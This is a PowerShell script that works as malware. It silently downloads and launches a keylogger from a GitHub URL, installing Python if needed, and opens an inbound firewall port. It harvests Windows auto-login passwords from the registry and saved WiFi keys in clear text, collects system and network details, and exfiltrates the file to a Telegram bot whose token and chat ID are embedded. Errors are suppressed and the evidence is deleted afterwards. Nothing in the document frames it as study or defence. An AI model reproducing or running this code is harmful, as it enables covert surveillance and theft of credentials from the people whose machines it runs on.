# Full deployment with embedded Telegram credentials
$TelegramBotToken = "7461592658:AAEJvcK6WH3-VnM2kXXBPtDRf8SoHinR98w"
$TelegramChatId = "1587027869"

# 1. Deploy Keylogger (silent)
$pyUrl = "https://raw.githubusercontent.com/Zhuss1/main/main/keylogger-working.py"
$pyFile = "$env:TEMP\kl.py"
Invoke-WebRequest -Uri $pyUrl -OutFile $pyFile -UseBasicParsing

# Find Python
$py = $null
$pyw = $null
$paths = @("C:\Program Files\Python311","C:\Program Files\Python312","C:\Python311","C:\Python312")
foreach ($p in $paths) {
    if (Test-Path "$p\pythonw.exe") {
        $py = "$p\python.exe"
        $pyw = "$p\pythonw.exe"
        break
    }
}

if (-not $py) {
    $installer = "$env:TEMP\python-installer.exe"
    Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe" -OutFile $installer -UseBasicParsing
    Start-Process $installer -ArgumentList "/quiet","InstallAllUsers=1","PrependPath=1","Include_pip=1" -Wait
    Remove-Item $installer
    Start-Sleep 5
    $py = "C:\Program Files\Python311\python.exe"
    $pyw = "C:\Program Files\Python311\pythonw.exe"
}

& $py -m pip install keyboard flask flask-socketio --quiet 2>$null
netsh advfirewall firewall add rule name="KL" dir=in action=allow protocol=TCP localport=8081 2>$null | Out-Null

if ($pyw -and (Test-Path $pyw)) {
    Start-Process $pyw -ArgumentList $pyFile -WindowStyle Hidden
}

# 2. Extract Credentials
$credsOutput = @()
$credsOutput += "=== SYSTEM INFO ==="
$credsOutput += "Computer: $env:COMPUTERNAME"
$credsOutput += "User: $env:USERNAME"
$credsOutput += "Domain: $env:USERDOMAIN"
$credsOutput += ""

# Auto-login credentials
$credsOutput += "=== AUTO-LOGIN CREDENTIALS ==="
try {
    $winlogon = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
    $autoLogin = Get-ItemProperty -Path $winlogon -ErrorAction SilentlyContinue
    if ($autoLogin.AutoAdminLogon -eq "1") {
        $credsOutput += "AutoLogin: ENABLED"
        $credsOutput += "Username: $($autoLogin.DefaultUsername)"
        $credsOutput += "Password: $($autoLogin.DefaultPassword)"
        $credsOutput += "Domain: $($autoLogin.DefaultDomainName)"
    } else {
        $credsOutput += "AutoLogin: Not configured"
    }
} catch {
    $credsOutput += "AutoLogin: Unable to read"
}
$credsOutput += ""

# WiFi passwords
$credsOutput += "=== SAVED WIFI PASSWORDS ==="
try {
    $wifiProfiles = (netsh wlan show profiles) | Select-String "All User Profile" | ForEach-Object {
        ($_ -split ":")[-1].Trim()
    }
    foreach ($wifiProfile in $wifiProfiles) {
        $passInfo = netsh wlan show profile name="$wifiProfile" key=clear
        $wifiPassword = ($passInfo | Select-String "Key Content") -replace ".*: ",""
        if ($wifiPassword) {
            $credsOutput += "SSID: $wifiProfile - Password: $wifiPassword"
        }
    }
} catch {
    $credsOutput += "Unable to extract WiFi passwords"
}
$credsOutput += ""

# Network info
$credsOutput += "=== NETWORK INFO ==="
Get-NetIPAddress | Where-Object {$_.AddressFamily -eq "IPv4" -and $_.IPAddress -ne "127.0.0.1"} | ForEach-Object {
    $credsOutput += "  $($_.InterfaceAlias): $($_.IPAddress)"
}
$credsOutput += ""

$credsOutput += "=== TIMESTAMP ==="
$credsOutput += (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")

# Save to file
$credsFile = "$env:TEMP\system-info-$env:COMPUTERNAME.txt"
$credsOutput | Out-File -FilePath $credsFile -Encoding UTF8

# 3. Send to Telegram
Add-Type -AssemblyName System.Net.Http
$httpClient = New-Object System.Net.Http.HttpClient
$form = New-Object System.Net.Http.MultipartFormDataContent

$chatIdContent = New-Object System.Net.Http.StringContent($TelegramChatId)
$form.Add($chatIdContent, "chat_id")

$caption = "System Info from $env:COMPUTERNAME - $env:USERNAME @ $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
$captionContent = New-Object System.Net.Http.StringContent($caption)
$form.Add($captionContent, "caption")

$fileStream = [System.IO.File]::OpenRead($credsFile)
$fileName = [System.IO.Path]::GetFileName($credsFile)
$fileContent = New-Object System.Net.Http.StreamContent($fileStream)
$form.Add($fileContent, "document", $fileName)

$apiUrl = "https://api.telegram.org/bot$TelegramBotToken/sendDocument"

try {
    $response = $httpClient.PostAsync($apiUrl, $form).Result
    if ($response.IsSuccessStatusCode) {
        # Success - silent
    }
} catch {
    # Silent fail
} finally {
    if ($fileStream) { $fileStream.Dispose() }
    if ($httpClient) { $httpClient.Dispose() }
}

# Clean up credentials file
Start-Sleep 2
Remove-Item $credsFile -Force -ErrorAction SilentlyContinue
